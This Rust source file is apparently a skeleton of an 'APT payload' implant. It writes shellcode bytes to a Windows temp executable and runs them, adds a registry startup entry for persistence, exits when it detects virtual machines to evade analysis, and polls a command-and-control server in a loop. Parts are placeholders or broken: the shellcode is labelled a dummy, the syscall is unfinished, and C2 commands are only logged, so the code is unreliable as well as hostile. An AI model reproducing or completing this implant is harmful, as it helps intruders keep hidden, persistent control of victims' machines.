use std::error::Error;
use std::fs::{self, File};
use std::io::Read;
use std::io::{self, Write};
use std::process::{Command, exit};
use std::path::Path;
use std::thread;
use std::time::Duration;
use serde::{Deserialize, Serialize};
use serde_json::Result as JsonResult;
use reqwest::blocking::Client;
use log::{info, error};
use aes::Aes256;
use aes::cipher::{BlockEncrypt, BlockDecrypt};

const PAYLOAD_PATH: &str = "C:\\Windows\\Temp\\payload.exe";
const ENCRYPTION_KEY: &[u8; 32] = b"01234567890123456789012345678901"; // Change to a secure key

#[derive(Serialize, Deserialize)]
struct Config {
    c2_server: String,
    registry_key: String,
    log_level: String,
}

fn main() -> Result<(), Box<dyn Error>> {
    // Initialize logging
    simple_logger::init_with_level(log::Level::Info)?;
    info!("Starting APT payload...");

    // Load configuration
    let config = load_config("config.json")?;
    
    // Check if running in a virtual environment
    if is_in_virtual_environment() {
        error!("Exiting due to detection of virtual environment.");
        exit(1);
    }

    // Create the payload
    create_payload()?;

    // Execute the payload
    execute_payload()?;

    // Setup persistence
    add_to_startup(&config.registry_key)?;

    // Start C2 communication
    let client = Client::new();
    loop {
        communicate_with_c2(&client, &config.c2_server)?;
        thread::sleep(Duration::from_secs(60)); // Poll every minute
    }
}

fn load_config(path: &str) -> Result<Config, Box<dyn Error>> {
    let config_data = fs::read_to_string(path)?;
    let config: Config = serde_json::from_str(&config_data)?;
    Ok(config)
}

fn create_payload() -> Result<(), Box<dyn Error>> {
    // Example: A dummy payload that would need to be replaced with actual payload bytes
    let asm_payload: &[u8] = &[
        0xEB, 0x1A, // jmp short
        0x5B, // pop ebx
        0x31, 0xC0, // xor eax, eax
        0x50, // push eax
        0x68, 0x65, 0x78, 0x65, 0x00, // push "exe"
        0x68, 0x63, 0x6D, 0x64, 0x00, // push "cmd"
        0x89, 0xE1, // mov ecx, esp
        0x50, // push eax
        0x51, // push ecx
        0xB8, 0x7B, 0x00, 0x00, 0x00, // mov eax, syscall (replace with actual syscall)
        0xFF, 0xD0, // call eax
        0xCC, // int 3 (for debugging)
    ];

    // Create the payload directory if it doesn't exist
    let payload_dir = Path::new(PAYLOAD_PATH).parent().unwrap();
    fs::create_dir_all(payload_dir)?;

    // Create the payload file
    let mut file = File::create(PAYLOAD_PATH)?;
    file.write_all(asm_payload)?;

    info!("Payload created at {}", PAYLOAD_PATH);
    Ok(())
}

fn execute_payload() -> Result<(), Box<dyn Error>> {
    let output = Command::new(PAYLOAD_PATH)
        .output()?;

    if output.status.success() {
        info!("Payload executed successfully.");
    } else {
        error!("Payload execution failed: {}", String::from_utf8_lossy(&output.stderr));
    }

    Ok(())
}

fn add_to_startup(registry_key: &str) -> Result<(), Box<dyn Error>> {
    let output = Command::new("reg")
        .args(&["add", registry_key, "/v", "MyPayload", "/t", "REG_SZ", "/d", PAYLOAD_PATH, "/f"])
        .output()?;

    if output.status.success() {
        info!("Successfully added to startup.");
    } else {
        error!("Failed to add to startup: {}", String::from_utf8_lossy(&output.stderr));
    }

    Ok(())
}

fn is_in_virtual_environment() -> bool {
    let artifacts = [
        "VBoxService",
        "vmware",
        "Hyper-V",
        "QEMU",
        "Xen",
    ];

    artifacts.iter().any(|&artifact| {
        Command::new("tasklist")
            .args(&["/FI", &format!("IMAGENAME eq {}.exe", artifact)])
            .output()
            .map(|output| !output.stdout.is_empty() && output.stdout.len() > 2)
            .unwrap_or(false)
    })
}

fn communicate_with_c2(client: &Client, c2_server: &str) -> Result<(), Box<dyn Error>> {
    // Implement C2 communication logic here
    // For example:
    let response = client.get(c2_server).send()?;
    if response.status().is_success() {
        let command = response.text()?;
        // Process the command
        info!("Received command from C2: {}", command);
    }
    Ok(())
}
